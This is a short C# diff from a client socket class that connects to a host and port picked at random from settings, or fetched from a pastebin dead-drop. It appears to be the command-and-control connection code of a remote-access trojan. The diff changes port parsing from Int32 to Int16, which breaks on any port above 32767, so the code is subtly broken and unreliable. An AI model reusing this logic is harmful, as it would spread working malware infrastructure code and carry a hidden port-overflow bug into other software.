@@ -47,7 +47,7 @@ namespace Client.Sockets
                 if (Settings.Pastebin == "null")
                 {
                     Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
-    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
+    Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 }
                 else
                 {
@@ -59,7 +59,7 @@ namespace Client.Sockets
                         string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                         Settings.Hosts = spl[0];
                         Settings.Ports = spl[new Random().Next(1, spl.Length)];
-                        Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
+                        Client.Connect(Settings.Hosts, Convert.ToInt16(Settings.Ports));
                     }
                 }
                 if (Client.Connected)
